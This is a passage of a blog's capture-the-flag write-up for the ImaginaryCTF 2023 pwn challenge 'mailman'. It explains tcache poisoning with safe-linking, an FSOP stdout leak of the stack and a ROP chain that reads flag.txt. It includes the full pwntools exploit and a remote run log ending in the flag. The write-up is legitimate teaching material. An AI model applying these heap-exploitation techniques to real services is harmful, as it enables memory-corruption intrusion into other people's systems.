+<p>Then, at the next <code>0x100</code> request <code>stdout</code> will be returned! Something important to notice if you’re a beginner in heap exploitation is how the safe-linking is handled, you have to xor the target location with <code>((chunk_location) &gt;&gt; 12))</code>. Sometimes the result is not properly aligned leading to a crash, to avoid this you can add or sub 0x8 to your target location.</p>
+<h2 id="FSOP-on-stdout"><a href="#FSOP-on-stdout" class="headerlink" title="FSOP on stdout"></a>FSOP on stdout</h2><p>To leak the address of the stack we can use a FSOP on stdout. To understand how a such attack does work I advice you to read my <a target="_blank" rel="noopener" href="https://ret2school.github.io/post/catastrophe/">this write-up</a>. The goal is to read the stack address stored at <code>libc.sym.environ</code> within the libc. Which gives:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tcache =&gt; stdout</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, pwn.flat(<span class="number">0xfbad1800</span>, <span class="comment"># _flags</span></span><br><span class="line">                        libc.sym.environ, <span class="comment"># _IO_read_ptr</span></span><br><span class="line">                        libc.sym.environ, <span class="comment"># _IO_read_end</span></span><br><span class="line">                        libc.sym.environ, <span class="comment"># _IO_read_base</span></span><br><span class="line">                        libc.sym.environ, <span class="comment"># _IO_write_base</span></span><br><span class="line">                        libc.sym.environ + <span class="number">0x8</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">                        libc.sym.environ + <span class="number">0x8</span>, <span class="comment"># _IO_write_end</span></span><br><span class="line">                        libc.sym.environ + <span class="number">0x8</span>, <span class="comment"># _IO_buf_base</span></span><br><span class="line">                        libc.sym.environ + <span class="number">8</span> <span class="comment"># _IO_buf_end</span></span><br><span class="line">                        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">stack = pwn.u64(io.recv(<span class="number">8</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x160</span> <span class="comment"># stackframe of fgets</span></span><br><span class="line">pwn.log.info(<span class="string">f&quot;stack: <span class="subst">&#123;<span class="built_in">hex</span>(stack)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="PROFIT"><a href="#PROFIT" class="headerlink" title="PROFIT"></a>PROFIT</h1><p>Now we leaked everything we just need to reuse the arbitrary write provided thanks to the house of botcake, given we already have overlapping chunks, to get another arbitrary write we just need to put the large chunk in a large tcache and the overlapped chunk in the <code>0x100</code> tcache, then we just have to corrupt <code>victim-&gt;fp</code> to the saved rip of the <code>fgets</code> stackframe :). It gives:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">rop = pwn.ROP(libc, base=stack)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPchain</span></span><br><span class="line">rop(rax=pwn.constants.SYS_open, rdi=stack + <span class="number">0xde</span> + <span class="number">2</span> - <span class="number">0x18</span>, rsi=pwn.constants.O_RDONLY) <span class="comment"># open</span></span><br><span class="line">rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">rop(rax=pwn.constants.SYS_read, rdi=<span class="number">3</span>, rsi=(stack &amp; ~<span class="number">0xfff</span>), rdx=<span class="number">0x300</span>) <span class="comment"># file descriptor bf ...</span></span><br><span class="line">rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line"></span><br><span class="line">rop(rax=pwn.constants.SYS_write, rdi=<span class="number">1</span>, rsi=(stack &amp; ~<span class="number">0xfff</span>), rdx=<span class="number">0x50</span>) <span class="comment"># write</span></span><br><span class="line">rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">rop.raw(<span class="string">&quot;./flag.txt\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># victim =&gt; tcache</span></span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># prev =&gt; tcache 0x140</span></span><br><span class="line">free(<span class="number">7</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache poisoning</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x130</span>, <span class="string">b&quot;T&quot;</span>*<span class="number">0x100</span> + pwn.p64(<span class="number">0</span>) + pwn.p64(<span class="number">0x111</span>) + pwn.p64(((stack - <span class="number">0x28</span>) ^ ((heap + <span class="number">0x2b90</span>) &gt;&gt; <span class="number">12</span>))))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">b&quot;TT&quot;</span>) <span class="comment"># dumb</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, pwn.p64(<span class="number">0x1337</span>)*<span class="number">5</span> + rop.chain())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Which gives:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exploit.py REMOTE HOST=mailman.chal.imaginaryctf.org PORT=1337</span><br><span class="line">[*] &#x27;/home/nasm/Documents/pwn/ImaginaryCTF/mailman/vuln&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] &#x27;/home/nasm/Documents/pwn/ImaginaryCTF/mailman/libc.so.6&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] &#x27;/home/nasm/Documents/pwn/ImaginaryCTF/mailman/ld-linux-x86-64.so.2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to mailman.chal.imaginaryctf.org on port 1337: Done</span><br><span class="line">[*] heap @ 0x5611bbf93000</span><br><span class="line">[+] libc: 0x7f6b49fec000</span><br><span class="line">[+] environ: 0x7f6b4a2932d8</span><br><span class="line">[+] stdout: 0x7f6b4a206780</span><br><span class="line">[*] stack: 0x7fff28533ba8</span><br><span class="line">[*] Loaded 218 cached gadgets for &#x27;/home/nasm/Documents/pwn/ImaginaryCTF/mailman/libc.so.6&#x27;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">ictf&#123;i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Annexes"><a href="#Annexes" class="headerlink" title="Annexes"></a>Annexes</h1><p>Final exploit:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfmate</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;vuln&quot;</span></span><br><span class="line">LIBC = <span class="string">&quot;/home/alexis/Documents/pwn/ImaginaryCTF/mailman/libc.so.6&quot;</span></span><br><span class="line">LD = <span class="string">&quot;/home/alexis/Documents/pwn/ImaginaryCTF/mailman/ld-linux-x86-64.so.2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = pwn.context.binary = pwn.ELF(BINARY)</span><br><span class="line">libc = pwn.ELF(LIBC)</span><br><span class="line">ld = pwn.ELF(LD)</span><br><span class="line">pwn.context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line">pwn.context.timeout = <span class="number">3</span></span><br><span class="line">p64 = pwn.p64</span><br><span class="line">u64 = pwn.u64</span><br><span class="line">p32 = pwn.p32</span><br><span class="line">u32 = pwn.u32</span><br><span class="line">p16 = pwn.p16</span><br><span class="line">u16 = pwn.u16</span><br><span class="line">p8  = pwn.p8</span><br><span class="line">u8  = pwn.u8</span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source ~/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">b* main</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    io = start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, data, noLine=<span class="literal">False</span></span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> noLine:</span><br><span class="line">            io.sendlineafter(<span class="string">b&quot;content: &quot;</span>, data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.sendafter(<span class="string">b&quot;content: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i, <span class="number">0x100</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    view(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    heap = ((pwn.u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span>) - <span class="number">0x2000</span>)</span><br><span class="line">    pwn.log.info(<span class="string">f&quot;heap @ <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">7</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>) <span class="comment"># prev</span></span><br><span class="line">    add(<span class="number">8</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>) <span class="comment"># a</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        add(<span class="number">9</span>, <span class="number">0x10</span>, <span class="string">b&quot;/bin/sh\0&quot;</span>) <span class="comment"># barrier</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">8</span>) <span class="comment"># free(a) =&gt; unsortedbin</span></span><br><span class="line">    free(<span class="number">7</span>) <span class="comment"># free(prev) =&gt; merged with a</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    view(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    libc.address = pwn.u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span> <span class="comment"># offset of the unsorted bin</span></span><br><span class="line">    pwn.log.success(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    stdout = libc.address + <span class="number">0x21a780</span></span><br><span class="line">    environ = libc.address + <span class="number">0x2a72d0</span> + <span class="number">8</span></span><br><span class="line">    strr = libc.address + <span class="number">0x1bd460</span></span><br><span class="line"></span><br><span class="line">    pwn.log.success(<span class="string">f&quot;environ: <span class="subst">&#123;<span class="built_in">hex</span>(environ)&#125;</span>&quot;</span>)</span><br><span class="line">    pwn.log.success(<span class="string">f&quot;stdout: <span class="subst">&#123;<span class="built_in">hex</span>(stdout)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x100</span>, <span class="string">b&quot;YY&quot;</span>) <span class="comment"># pop a chunk from the tcache to let an entry left to a </span></span><br><span class="line">    free(<span class="number">8</span>) <span class="comment"># free(a) =&gt; tcache</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsortedbin =&gt; oob on a =&gt; tcache poisoning</span></span><br><span class="line">    add(</span><br><span class="line">        <span class="number">1</span>, <span class="number">0x130</span>, pwn.flat(</span><br><span class="line">                            <span class="string">b&quot;T&quot;</span>*<span class="number">0x108</span> + pwn.p64(<span class="number">0x111</span>),</span><br><span class="line">                           (stdout) ^ ((heap + <span class="number">0x2b90</span>) &gt;&gt; <span class="number">12</span>)</span><br><span class="line">                           )</span><br><span class="line">        )</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">b&quot;TT&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache =&gt; stdout</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x100</span>, pwn.flat(<span class="number">0xfbad1800</span>, <span class="comment"># _flags</span></span><br><span class="line">                           libc.sym.environ, <span class="comment"># _IO_read_ptr</span></span><br><span class="line">                           libc.sym.environ, <span class="comment"># _IO_read_end</span></span><br><span class="line">                           libc.sym.environ, <span class="comment"># _IO_read_base</span></span><br><span class="line">                           libc.sym.environ, <span class="comment"># _IO_write_base</span></span><br><span class="line">                           libc.sym.environ + <span class="number">0x8</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">                           libc.sym.environ + <span class="number">0x8</span>, <span class="comment"># _IO_write_end</span></span><br><span class="line">                           libc.sym.environ + <span class="number">0x8</span>, <span class="comment"># _IO_buf_base</span></span><br><span class="line">                           libc.sym.environ + <span class="number">8</span> <span class="comment"># _IO_buf_end</span></span><br><span class="line">                           )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    stack = pwn.u64(io.recv(<span class="number">8</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x160</span> <span class="comment"># stackframe of fgets</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;stack: <span class="subst">&#123;<span class="built_in">hex</span>(stack)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rop = pwn.ROP(libc, base=stack)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ROPchain</span></span><br><span class="line">    rop(rax=pwn.constants.SYS_open, rdi=stack + <span class="number">0xde</span> + <span class="number">2</span> - <span class="number">0x18</span>, rsi=pwn.constants.O_RDONLY) <span class="comment"># open</span></span><br><span class="line">    rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">    rop(rax=pwn.constants.SYS_read, rdi=<span class="number">3</span>, rsi=(stack &amp; ~<span class="number">0xfff</span>), rdx=<span class="number">0x300</span>) <span class="comment"># file descriptor bf ...</span></span><br><span class="line">    rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    rop(rax=pwn.constants.SYS_write, rdi=<span class="number">1</span>, rsi=(stack &amp; ~<span class="number">0xfff</span>), rdx=<span class="number">0x50</span>) <span class="comment"># write</span></span><br><span class="line">    rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">    rop.raw(<span class="string">&quot;./flag.txt\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># victim =&gt; tcache</span></span><br><span class="line">    free(<span class="number">8</span>) </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># prev =&gt; tcache 0x140</span></span><br><span class="line">    free(<span class="number">7</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    add(<span class="number">5</span>, <span class="number">0x130</span>, <span class="string">b&quot;T&quot;</span>*<span class="number">0x100</span> + pwn.p64(<span class="number">0</span>) + pwn.p64(<span class="number">0x111</span>) + pwn.p64(((stack - <span class="number">0x28</span>) ^ ((heap + <span class="number">0x2b90</span>) &gt;&gt; <span class="number">12</span>))))</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">b&quot;TT&quot;</span>) <span class="comment"># dumb</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(rop.dump())</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x100</span>, pwn.p64(<span class="number">0x1337</span>)*<span class="number">5</span> + rop.chain())</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/posts/iwindow/"
+      title="[ImaginaryCTF 2023 - pwn] window-of-opportunity"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        [ImaginaryCTF 2023 - pwn] window-of-opportunity
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/posts/writemeabook/"
+      title="[Grey Cat CTF Quals 2023 - pwn] Write me a Book"
+     >
+
+    <p class="title-text">
+      
+        [Grey Cat CTF Quals 2023 - pwn] Write me a Book
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2023 nasm<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
+        <span class="material-symbols-rounded">keyboard_arrow_up</span>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.style.opacity = 1;
+        } else {
+            btn.style.opacity = 0;
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
